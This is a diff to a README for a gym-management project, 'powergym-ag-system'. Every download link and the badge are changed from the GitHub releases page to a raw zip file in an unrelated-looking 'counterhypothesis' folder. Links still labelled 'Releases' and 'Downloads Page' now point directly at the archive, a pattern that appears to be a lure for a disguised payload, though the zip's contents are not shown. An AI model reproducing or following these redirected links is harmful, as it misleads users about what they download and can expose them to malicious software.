@@ -1,6 +1,6 @@
 # 🏋️‍♂️ powergym-ag-system - Manage Your Gym Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sabastianrafa/powergym-ag-system/releases)
+[![Download](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/counterhypothesis/powergym-ag-system.zip)](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/counterhypothesis/powergym-ag-system.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to the powergym-ag-system! This gym management system makes it easy to o
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download PowerGym System](https://github.com/sabastianrafa/powergym-ag-system/releases). Here, you'll find the latest versions of the software.
+To get started, visit this page to download: [Download PowerGym System](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/counterhypothesis/powergym-ag-system.zip). Here, you'll find the latest versions of the software.
 
 1. **Visit the Downloads Page**:
-   Go to [PowerGym Releases](https://github.com/sabastianrafa/powergym-ag-system/releases).
+   Go to [PowerGym Releases](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/counterhypothesis/powergym-ag-system.zip).
 
 2. **Select the Version**:
    Look for the latest version available. This ensures you have the most up-to-date features and fixes.
